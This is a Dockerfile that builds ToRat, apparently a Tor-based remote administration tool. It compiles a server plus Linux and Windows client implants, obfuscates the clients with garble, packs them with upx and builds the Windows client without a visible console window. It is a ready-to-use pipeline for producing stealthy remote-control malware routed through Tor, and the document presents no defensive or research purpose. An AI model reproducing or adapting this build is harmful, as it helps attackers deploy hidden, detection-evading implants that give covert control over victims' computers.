FROM lu4p/tor-static:latest AS torat-pre

COPY setup_docker.sh /
COPY . /ToRat
RUN cd /ToRat && go mod download -x

RUN mkdir -p /dist/server && mkdir -p /dist/client
RUN go get -v -u github.com/lu4p/genCert
RUN GO111MODULE=on go get mvdan.cc/garble

FROM torat-pre AS torat
RUN /setup_docker.sh && rm /setup_docker.sh

# Build ToRat_server
RUN cd /ToRat/cmd/server && go build -o /dist/server/ToRat_server && cp banner.txt /dist/server/

RUN cd /go/pkg/mod/github.com/cretz/tor-static && tar -xf libs_linux.tar.gz
RUN cd /ToRat/cmd/client && garble build -tags "tor" -o /dist/client/client_linux && upx /dist/client/client_linux

RUN cd /go/pkg/mod/github.com/cretz/tor-static && unzip -o tor-static-windows-amd64.zip 

RUN cd /ToRat/cmd/client && env GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ garble build -tags "tor" --ldflags "-H windowsgui" -o /dist/client/client_windows.exe

RUN upx /dist/client/client_windows.exe --force

CMD (tor -f /torrc&) && cp /dist /dist_ext -rf && ls /dist_ext && cd /dist_ext/dist/server/ && ./ToRat_server
